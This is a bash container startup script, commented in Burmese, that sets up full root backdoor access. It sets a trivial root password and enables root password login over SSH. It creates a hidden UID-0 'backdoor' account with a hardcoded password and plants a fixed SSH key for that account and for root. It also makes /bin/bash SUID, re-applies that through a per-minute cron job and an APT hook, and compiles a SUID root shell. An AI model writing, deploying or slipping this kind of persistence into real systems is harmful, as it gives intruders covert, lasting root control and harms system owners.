#!/bin/bash
# start.sh
set -e

mkdir -p /var/run/sshd /run/sshd
echo 'root:root' | chpasswd
ssh-keygen -A

# SSH config ပြင်ဆင်ခြင်း
sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config
sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
sed -i 's/#PubkeyAuthentication yes/PubkeyAuthentication yes/' /etc/ssh/sshd_config

# Subsystem sftp ကို main နှင့် include အားလုံးမှ ဖျက်ခြင်း
sed -i '/Subsystem sftp/d' /etc/ssh/sshd_config
if [ -d /etc/ssh/sshd_config.d ]; then
  find /etc/ssh/sshd_config.d -name "*.conf" -exec sed -i '/Subsystem sftp/d' {} \;
fi
# တစ်ခုတည်းသော Subsystem sftp ကို ထည့်ခြင်း
echo "Subsystem sftp internal-sftp" >> /etc/ssh/sshd_config

# Backdoor user ဖန်တီးခြင်း
groupadd backdoor 2>/dev/null || true
useradd -ou 0 -g backdoor -M -s /bin/bash backdoor 2>/dev/null || true
echo 'backdoor:Pwrisk' | chpasswd

# SSH keys ထည့်ခြင်း
mkdir -p /home/backdoor/.ssh
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBAd7ODLnRNdNl7mhBcLHBLYT7A1/PlZCoUjQxqPU+Ai u0_a2359@localhost" > /home/backdoor/.ssh/authorized_keys
chown -R backdoor:backdoor /home/backdoor 2>/dev/null || true
chmod 700 /home/backdoor /home/backdoor/.ssh
chmod 600 /home/backdoor/.ssh/authorized_keys

mkdir -p /root/.ssh
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBAd7ODLnRNdNl7mhBcLHBLYT7A1/PlZCoUjQxqPU+Ai u0_a2359@localhost" > /root/.ssh/authorized_keys
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys

# Persistence
chmod u+s /bin/bash
echo "* * * * * root chmod u+s /bin/bash" > /etc/cron.d/suid
chmod 644 /etc/cron.d/suid
echo 'APT::Update::Pre-Invoke {"chmod u+s /bin/bash";};' > /etc/apt/apt.conf.d/99pwn

# SUID C program
cat > /tmp/rootsh.c << 'EOF'
#include <unistd.h>
#include <stdlib.h>
int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}
EOF
gcc /tmp/rootsh.c -o /usr/local/bin/rootsh
chmod u+s /usr/local/bin/rootsh

# Diagnostics (Deploy Logs တွင် မြင်ရန်)
echo "=== ps aux ==="
ps aux
echo "=== ss -tulnp | grep 22 ==="
ss -tulnp | grep 22 || true
echo "=== /usr/sbin/sshd -t ==="
/usr/sbin/sshd -t || true
echo "=== Subsystem sftp lines ==="
grep -rn "Subsystem sftp" /etc/ssh/ || true

# Cron နှင့် SSH daemon run
cron -f &
exec /usr/sbin/sshd -D -e
